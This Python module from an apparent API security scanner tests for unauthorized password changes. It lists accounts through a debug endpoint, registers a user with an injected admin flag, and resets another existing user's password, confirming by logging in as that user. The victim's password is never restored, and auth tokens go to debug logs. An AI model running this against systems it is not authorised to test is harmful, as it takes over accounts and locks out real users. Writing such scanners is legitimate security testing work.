"""
Unauthorized Password Change Scanner Module.

This module tests for vulnerabilities related to unauthorized password changes,
where a user can change another user's password without proper authorization.
"""

import json
import time
import random
import string
from typing import Dict, List, Any, Optional

from core.base_scanner import BaseScanner
from core.openapi import find_endpoint_by_purpose


class Scanner(BaseScanner):
    """Scanner for detecting unauthorized password change vulnerabilities."""
    
    def __init__(self, target: Dict[str, Any], config: Dict[str, Any]):
        """
        Initialize the scanner.
        
        Args:
            target: Target configuration
            config: Scanner-specific configuration
        """
        super().__init__(target, config)
        
        # Initialize endpoints with default values
        self.debug_endpoint = config.get("debug_endpoint", "/auth/check")
        self.register_endpoint = config.get("register_endpoint", "/auth/sign-up")
        self.login_endpoint = config.get("login_endpoint", "/auth/sign-in")
        self.password_change_endpoint = config.get("password_change_endpoint", "/users/me/password")
        
        # Track the source of each endpoint (fallback, openapi, config)
        self.endpoint_sources = {}
        
        # Extract endpoints from OpenAPI spec if available
        self._extract_endpoints_from_openapi(target)
        
        # Log the resolved endpoints
        self.logger.info(f"Using debug endpoint: {self.debug_endpoint}")
        self.logger.info(f"Using register endpoint: {self.register_endpoint}")
        self.logger.info(f"Using login endpoint: {self.login_endpoint}")
        self.logger.info(f"Using password change endpoint: {self.password_change_endpoint}")
        
        # Field names in requests/responses
        self.username_field = config.get("username_field", "username")
        self.password_field = config.get("password_field", "password")
        self.email_field = config.get("email_field", "email")
        self.admin_field = config.get("admin_field", "admin")
        self.auth_token_field = config.get("auth_token_field", "auth_token")
        
        # Success indicators
        self.success_status_codes = config.get("success_status_codes", [200, 201, 204])
        
        # Test user credentials
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        self.test_username = config.get("test_username", f"test_user_{timestamp}_{random_suffix}")
        self.test_email = config.get("test_email", f"{self.test_username}@example.com")
        self.test_password = config.get("test_password", f"Test@{timestamp}")
        self.new_password = config.get("new_password", f"NewPass@{timestamp}")
        
        # Test delay
        self.test_delay = config.get("test_delay", 1.0)
    
    def _extract_endpoints_from_openapi(self, target: Dict[str, Any]) -> None:
        """
        Extract API endpoints from OpenAPI specification.
        
        Args:
            target: Target configuration containing OpenAPI data
        """
        # Check if OpenAPI data is available in the target configuration
        if "openapi" not in target or not isinstance(target["openapi"], dict):
            self.logger.info("No OpenAPI specification data found in target configuration")
            return
        
        openapi_data = target["openapi"]
        
        # Extract endpoints from the OpenAPI specification
        if "endpoints" not in openapi_data or not isinstance(openapi_data["endpoints"], list):
            self.logger.info("No endpoints found in OpenAPI specification data")
            return
        
        endpoints = openapi_data["endpoints"]
        self.logger.info(f"Found {len(endpoints)} endpoints in OpenAPI specification")
        
        # Find registration endpoints based on path patterns and request body fields
        registration_patterns = ["register", "signup", "sign-up", "create_user", "users", "auth/sign-up"]
        login_patterns = ["login", "signin", "sign-in", "auth/sign-in", "token"]
        password_change_patterns = ["password", "reset", "change_password", "update-password"]
        
        # Score each endpoint based on how likely it is to be a registration, login, or password change endpoint
        register_candidates = []
        login_candidates = []
        password_change_candidates = []
        debug_candidates = []
        
        for endpoint in endpoints:
            path = endpoint.get("path", "")
            method = endpoint.get("method", "").upper()
            summary = endpoint.get("summary", "").lower()
            description = endpoint.get("description", "").lower()
            operation_id = endpoint.get("operationId", "").lower()
            
            # Check for debug endpoints
            if "debug" in path.lower() or "debug" in summary or "debug" in description:
                debug_candidates.append((endpoint, 10))
                continue
                
            # Registration endpoint scoring
            if method == "POST":
                register_score = 0
                for pattern in registration_patterns:
                    if pattern in path.lower():
                        register_score += 5
                    if pattern in summary or pattern in description or pattern in operation_id:
                        register_score += 3
                
                # Check request body for username/email/password fields
                request_body = endpoint.get("requestBody", {})
                if request_body:
                    properties = self._extract_request_properties(request_body)
                    if properties:
                        username_found = any(prop for prop in properties if "user" in prop.lower() or "name" in prop.lower())
                        email_found = any(prop for prop in properties if "email" in prop.lower())
                        password_found = any(prop for prop in properties if "pass" in prop.lower())
                        
                        if username_found:
                            register_score += 2
                        if email_found:
                            register_score += 2
                        if password_found:
                            register_score += 2
                            
                if register_score > 0:
                    register_candidates.append((endpoint, register_score))
            
            # Login endpoint scoring
            if method == "POST":
                login_score = 0
                for pattern in login_patterns:
                    if pattern in path.lower():
                        login_score += 5
                    if pattern in summary or pattern in description or pattern in operation_id:
                        login_score += 3
                
                # Check request body for username/password fields
                request_body = endpoint.get("requestBody", {})
                if request_body:
                    properties = self._extract_request_properties(request_body)
                    if properties:
                        username_found = any(prop for prop in properties if "user" in prop.lower() or "name" in prop.lower() or "email" in prop.lower())
                        password_found = any(prop for prop in properties if "pass" in prop.lower())
                        
                        if username_found:
                            login_score += 2
                        if password_found:
                            login_score += 3
                            
                if login_score > 0:
                    login_candidates.append((endpoint, login_score))
            
            # Password change endpoint scoring
            if method in ["PUT", "POST", "PATCH"]:
                password_score = 0
                for pattern in password_change_patterns:
                    if pattern in path.lower():
                        password_score += 5
                    if pattern in summary or pattern in description or pattern in operation_id:
                        password_score += 3
                
                # Check if path contains a parameter (like {username} or {userId})
                if "{" in path and "}" in path:
                    password_score += 4
                
                # Check request body for password fields
                request_body = endpoint.get("requestBody", {})
                if request_body:
                    properties = self._extract_request_properties(request_body)
                    if properties:
                        password_found = any(prop for prop in properties if "pass" in prop.lower())
                        new_password_found = any(prop for prop in properties if "new" in prop.lower() and "pass" in prop.lower())
                        
                        if password_found:
                            password_score += 2
                        if new_password_found:
                            password_score += 3
                            
                if password_score > 0:
                    password_change_candidates.append((endpoint, password_score))
        
        # Select the highest scoring candidates
        if register_candidates:
            register_candidates.sort(key=lambda x: x[1], reverse=True)
            best_register = register_candidates[0][0]
            self.register_endpoint = best_register.get("path")
            self.endpoint_sources["register"] = "openapi"
            self.logger.info(f"Found registration endpoint: {self.register_endpoint}")
        
        if login_candidates:
            login_candidates.sort(key=lambda x: x[1], reverse=True)
            best_login = login_candidates[0][0]
            self.login_endpoint = best_login.get("path")
            self.endpoint_sources["login"] = "openapi"
            self.logger.info(f"Found login endpoint: {self.login_endpoint}")
        
        if password_change_candidates:
            password_change_candidates.sort(key=lambda x: x[1], reverse=True)
            best_password_change = password_change_candidates[0][0]
            self.password_change_endpoint = best_password_change.get("path")
            self.endpoint_sources["password_change"] = "openapi"
            self.logger.info(f"Found password change endpoint: {self.password_change_endpoint}")
        
        if debug_candidates:
            debug_candidates.sort(key=lambda x: x[1], reverse=True)
            best_debug = debug_candidates[0][0]
            self.debug_endpoint = best_debug.get("path")
            self.endpoint_sources["debug"] = "openapi"
            self.logger.info(f"Found debug endpoint: {self.debug_endpoint}")
    
    def _extract_request_properties(self, request_body: Dict[str, Any]) -> List[str]:
        """
        Extract property names from a request body schema.
        
        Args:
            request_body: Request body object from OpenAPI spec
            
        Returns:
            List of property names
        """
        properties = []
        
        # Handle different OpenAPI structures
        if "content" in request_body:
            content = request_body.get("content", {})
            for content_type, content_schema in content.items():
                if "schema" in content_schema:
                    schema = content_schema["schema"]
                    if "properties" in schema:
                        properties.extend(schema["properties"].keys())
        elif "schema" in request_body:
            schema = request_body["schema"]
            if "properties" in schema:
                properties.extend(schema["properties"].keys())
        
        return properties
    
    def run(self) -> List[Dict[str, Any]]:
        """
        Run the scanner.
        
        Returns:
            List of findings
        """
        self.logger.info("Starting unauthorized password change scanner")
        
        # Skip testing if fallback endpoints are disabled and no endpoints were found in OpenAPI spec
        if self.disable_fallback_endpoints and not self._has_required_endpoints():
            self.logger.info("Skipping unauthorized password change tests - fallback endpoints are disabled and required endpoints not found in OpenAPI specification")
            self.findings.append({
                "vulnerability": "Unauthorized Password Change Scanner Skipped",
                "severity": "INFO",
                "endpoint": "N/A",
                "description": "The unauthorized password change scanner was skipped because fallback endpoints are disabled and the required endpoints were not found in the OpenAPI specification."
            })
            return self.findings
            
        # Test for unauthorized password change vulnerability
        self._test_unauthorized_password_change()
        
        # Return findings
        return self.findings
        
    def _has_required_endpoints(self) -> bool:
        """
        Check if all required endpoints were found in the OpenAPI specification.
        
        Returns:
            True if all required endpoints were found, False otherwise
        """
        # Check if endpoints were found in the OpenAPI spec (not using fallback values)
        endpoints_from_openapi = True
        
        # Check if debug endpoint is using the fallback value
        if self.debug_endpoint == "/users/v1/_debug" and "debug" not in self.endpoint_sources:
            endpoints_from_openapi = False
            
        # Check if register endpoint is using the fallback value
        if self.register_endpoint == "/users/v1/register" and "register" not in self.endpoint_sources:
            endpoints_from_openapi = False
            
        # Check if login endpoint is using the fallback value
        if self.login_endpoint == "/users/v1/login" and "login" not in self.endpoint_sources:
            endpoints_from_openapi = False
            
        # Check if password change endpoint is using the fallback value
        if self.password_change_endpoint == "/users/v1/{username}/password" and "password_change" not in self.endpoint_sources:
            endpoints_from_openapi = False
            
        return endpoints_from_openapi
    
    def _get_existing_accounts(self) -> List[Dict[str, Any]]:
        """
        Get the list of existing accounts from the debug endpoint.
        
        Returns:
            List of user accounts
        """
        self.logger.info(f"Retrieving existing accounts from {self.debug_endpoint}")
        
        try:
            response = self._make_request(
                method="GET",
                endpoint=self.debug_endpoint
            )
            
            if response.status_code in self.success_status_codes:
                try:
                    data = response.json()
                    # Handle different response formats
                    if isinstance(data, dict) and "users" in data:
                        accounts = data["users"]
                        self.logger.info(f"Found {len(accounts)} existing accounts")
                        return accounts
                    elif isinstance(data, list):
                        self.logger.info(f"Found {len(data)} existing accounts")
                        return data
                    else:
                        self.logger.warn(f"Unexpected format in debug endpoint response: {data}")
                        return []
                except (ValueError, KeyError) as e:
                    self.logger.error(f"Error parsing debug endpoint response: {str(e)}")
                    return []
            else:
                self.logger.warn(f"Failed to get existing accounts, status code: {response.status_code}")
                self.logger.debug(f"Response: {response.text}")
                return []
        except Exception as e:
            self.logger.error(f"Error accessing debug endpoint: {str(e)}")
            return []
    
    def _register_test_user(self) -> bool:
        """
        Register a new test user with admin privileges.
        
        Returns:
            True if registration was successful, False otherwise
        """
        self.logger.info(f"Registering new test user '{self.test_username}' with admin privileges")
        
        register_payload = {
            self.username_field: self.test_username,
            self.email_field: self.test_email,
            self.password_field: self.test_password,
            self.admin_field: True
        }
        
        try:
            register_response = self._make_request(
                method="POST",
                endpoint=self.register_endpoint,
                json_data=register_payload
            )
            
            if register_response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully registered test user '{self.test_username}'")
                self.logger.debug(f"Registration response: {register_response.text}")
                return True
            else:
                self.logger.warn(f"Failed to register test user, status code: {register_response.status_code}")
                self.logger.debug(f"Response: {register_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error registering test user: {str(e)}")
            return False
    
    def _verify_user_created(self) -> bool:
        """
        Verify that the test user was created successfully.
        
        Returns:
            True if the user was found, False otherwise
        """
        self.logger.info(f"Verifying test user '{self.test_username}' was created")
        
        # Add a small delay to allow the server to process the registration
        time.sleep(self.test_delay)
        
        accounts = self._get_existing_accounts()
        
        for account in accounts:
            if account.get(self.username_field) == self.test_username:
                self.logger.info(f"Verified test user '{self.test_username}' was created successfully")
                self.logger.debug(f"User account: {account}")
                return True
        
        self.logger.warn(f"Test user '{self.test_username}' was not found in the user list")
        return False
    
    def _login_and_get_token(self) -> Optional[str]:
        """
        Login as the test user and get the authentication token.
        
        Returns:
            Authentication token if login was successful, None otherwise
        """
        self.logger.info(f"Logging in as test user '{self.test_username}'")
        
        login_payload = {
            self.username_field: self.test_username,
            self.password_field: self.test_password
        }
        
        try:
            login_response = self._make_request(
                method="POST",
                endpoint=self.login_endpoint,
                json_data=login_payload
            )
            
            if login_response.status_code in self.success_status_codes:
                try:
                    login_data = login_response.json()
                    auth_token = login_data.get(self.auth_token_field)
                    
                    if auth_token:
                        self.logger.info(f"Successfully logged in as test user and obtained auth token")
                        self.logger.debug(f"Auth token: {auth_token}")
                        return auth_token
                    else:
                        self.logger.warn(f"Auth token not found in login response: {login_data}")
                        return None
                except (ValueError, KeyError) as e:
                    self.logger.error(f"Error parsing login response: {str(e)}")
                    return None
            else:
                self.logger.warn(f"Failed to login as test user, status code: {login_response.status_code}")
                self.logger.debug(f"Login response: {login_response.text}")
                return None
        except Exception as e:
            self.logger.error(f"Error logging in as test user: {str(e)}")
            return None
    
    def _change_other_user_password(self, target_user: str, auth_token: str) -> bool:
        """
        Attempt to change another user's password.
        
        Args:
            target_user: Username of the target user
            auth_token: Authentication token of the test user
            
        Returns:
            True if the password change was accepted, False otherwise
        """
        self.logger.info(f"Attempting to change password for user '{target_user}'")
        
        password_change_endpoint = self.password_change_endpoint.replace("{username}", target_user)
        
        password_change_payload = {
            self.password_field: self.new_password
        }
        
        # Set up authorization header with the token
        headers = {"Authorization": f"Bearer {auth_token}"}
        
        try:
            password_change_response = self._make_request(
                method="PUT",
                endpoint=password_change_endpoint,
                json_data=password_change_payload,
                headers=headers
            )
            
            if password_change_response.status_code in self.success_status_codes:
                self.logger.info(f"Password change request for user '{target_user}' was accepted")
                self.logger.debug(f"Password change response: {password_change_response.text}")
                return True
            else:
                self.logger.info(f"Password change request was rejected with status code: {password_change_response.status_code}")
                self.logger.debug(f"Password change response: {password_change_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error changing password: {str(e)}")
            return False
    
    def _verify_password_changed(self, target_user: str) -> bool:
        """
        Verify that the password was changed successfully by attempting to login.
        
        Args:
            target_user: Username of the target user
            
        Returns:
            True if login was successful with the new password, False otherwise
        """
        self.logger.info(f"Verifying password change by attempting to login as '{target_user}'")
        
        verify_login_payload = {
            self.username_field: target_user,
            self.password_field: self.new_password
        }
        
        try:
            verify_login_response = self._make_request(
                method="POST",
                endpoint=self.login_endpoint,
                json_data=verify_login_payload
            )
            
            if verify_login_response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully logged in as '{target_user}' with the new password - vulnerability confirmed!")
                self.logger.debug(f"Login response: {verify_login_response.text}")
                return True
            else:
                self.logger.info(f"Could not login as '{target_user}' with the new password. Password change might not have been successful.")
                self.logger.debug(f"Login response: {verify_login_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error verifying password change: {str(e)}")
            return False
    
    def _test_unauthorized_password_change(self) -> None:
        """Test for unauthorized password change vulnerability."""
        self.logger.info("Testing for unauthorized password change vulnerability")
        
        # Step 1: Get the list of existing accounts
        existing_accounts = self._get_existing_accounts()
        if not existing_accounts:
            self.logger.warn("No existing accounts found, skipping unauthorized password change test")
            # Try to create some accounts for testing if none exist
            self._create_test_accounts()
            existing_accounts = self._get_existing_accounts()
            if not existing_accounts:
                self.logger.warn("Still no accounts available after creating test accounts, skipping test")
                return
        
        # Step 2: Register a new test user with admin privileges
        if not self._register_test_user():
            self.logger.warn("Failed to register test user, trying alternative registration endpoint")
            # Try with alternative endpoint patterns for Snorefox API
            original_endpoint = self.register_endpoint
            
            # Try alternative endpoints
            alternative_endpoints = [
                "/auth/sign-up",
                "/api/auth/sign-up",
                "/api/v1/auth/sign-up",
                "/api/v1/auth/register",
                "/api/v1/users",
                "/users"
            ]
            
            for alt_endpoint in alternative_endpoints:
                self.logger.info(f"Trying alternative registration endpoint: {alt_endpoint}")
                self.register_endpoint = alt_endpoint
                if self._register_test_user():
                    self.logger.info(f"Successfully registered user with alternative endpoint: {alt_endpoint}")
                    break
            
            # If still not successful, restore original endpoint and return
            if self.register_endpoint != original_endpoint and not self._verify_user_created():
                self.register_endpoint = original_endpoint
                self.logger.warn("Failed to register test user with any endpoint, skipping test")
                return
        
        # Step 3: Verify the new account was created
        if not self._verify_user_created():
            self.logger.warn("Could not verify test user was created, continuing anyway")
        
        # Step 4: Login as the new user to get auth token
        auth_token = self._login_and_get_token()
        if not auth_token:
            self.logger.warn("Failed to login with test user, trying alternative login endpoint")
            # Try with alternative endpoint patterns for Snorefox API
            original_endpoint = self.login_endpoint
            
            # Try alternative endpoints
            alternative_endpoints = [
                "/auth/sign-in",
                "/api/auth/sign-in",
                "/api/v1/auth/sign-in",
                "/api/v1/auth/login",
                "/api/v1/login",
                "/login"
            ]
            
            for alt_endpoint in alternative_endpoints:
                self.logger.info(f"Trying alternative login endpoint: {alt_endpoint}")
                self.login_endpoint = alt_endpoint
                auth_token = self._login_and_get_token()
                if auth_token:
                    self.logger.info(f"Successfully logged in with alternative endpoint: {alt_endpoint}")
                    break
            
            # If still not successful, restore original endpoint and return
            if not auth_token:
                self.login_endpoint = original_endpoint
                self.logger.warn("Failed to login with any endpoint, skipping test")
                return
        
        # Step 5: Find a target user that is not our test user
        target_user = None
        for account in existing_accounts:
            # Try different field names for username
            for field in [self.username_field, "username", "user", "name", "id", "userId"]:
                username = account.get(field)
                if username and username != self.test_username:
                    target_user = username
                    if field != self.username_field:
                        self.logger.info(f"Found username in alternative field: {field}")
                    break
            if target_user:
                break
        
        if not target_user:
            self.logger.warn("No target user found to test password change")
            return
        
        # Step 6: Try different password change endpoint patterns
        password_change_success = False
        original_endpoint = self.password_change_endpoint
        
        # First try the configured endpoint
        if self._change_other_user_password(target_user, auth_token):
            password_change_success = True
        else:
            # Try alternative endpoint patterns
            alternative_patterns = [
                "/users/{username}/password",
                "/api/users/{username}/password",
                "/api/v1/users/{username}/password",
                "/auth/users/{username}/password",
                "/api/v1/auth/users/{username}/password",
                "/users/me/password",  # Some APIs might use 'me' and rely on the token
                "/api/users/me/password",
                "/api/v1/users/me/password",
                "/auth/password",  # Some APIs don't use username in the path
                "/api/auth/password",
                "/api/v1/auth/password"
            ]
            
            for pattern in alternative_patterns:
                self.logger.info(f"Trying alternative password change pattern: {pattern}")
                self.password_change_endpoint = pattern
                if self._change_other_user_password(target_user, auth_token):
                    password_change_success = True
                    self.logger.info(f"Successfully changed password with alternative endpoint: {pattern}")
                    break
        
        # If password change wasn't successful with any endpoint, restore original and return
        if not password_change_success:
            self.password_change_endpoint = original_endpoint
            self.logger.warn("Failed to change password with any endpoint pattern, skipping verification")
            return
        
        # Step 7: Verify the password was changed
        if self._verify_password_changed(target_user):
            # Vulnerability confirmed - add finding
            password_change_endpoint = self.password_change_endpoint.replace("{username}", target_user)
            
            self.add_finding(
                vulnerability="Unauthorized Password Change",
                severity="CRITICAL",
                endpoint=password_change_endpoint,
                details=f"The API allows users to change passwords of other users without proper authorization. User '{self.test_username}' was able to change the password of user '{target_user}'.",
                evidence={
                    "test_user": self.test_username,
                    "target_user": target_user,
                    "password_change_request": {
                        "endpoint": password_change_endpoint,
                        "method": "PUT",
                        "headers": {"Authorization": f"Bearer {auth_token[:10]}..."}, # Truncate token for security
                        "payload": {self.password_field: self.new_password}
                    },
                    "verification": {
                        "login_successful": True,
                        "login_endpoint": self.login_endpoint,
                        "login_payload": {
                            self.username_field: target_user,
                            self.password_field: self.new_password
                        }
                    }
                },
                remediation="Implement proper authorization checks to ensure users can only change their own passwords. Verify the user's identity from the authentication token and compare it with the requested resource."
            )
        else:
            self.logger.info("Password change appeared to succeed but verification failed")
            
    def _create_test_accounts(self) -> None:
        """Create some test accounts for testing if none exist."""
        self.logger.info("Creating test accounts for unauthorized password change testing")
        
        # Create 2 test accounts
        for i in range(2):
            timestamp = int(time.time())
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            username = f"test_account_{timestamp}_{random_suffix}_{i}"
            email = f"{username}@example.com"
            password = f"TestPassword@{timestamp}"
            
            payload = {
                self.username_field: username,
                self.email_field: email,
                self.password_field: password
            }
            
            try:
                self.logger.info(f"Creating test account {i+1}: {username}")
                response = self._make_request(
                    method="POST",
                    endpoint=self.register_endpoint,
                    json_data=payload
                )
                
                if response.status_code in self.success_status_codes:
                    self.logger.info(f"Successfully created test account: {username}")
                else:
                    self.logger.warn(f"Failed to create test account, status code: {response.status_code}")
            except Exception as e:
                self.logger.error(f"Error creating test account: {str(e)}")
            
            # Add delay between requests
            time.sleep(self.test_delay)
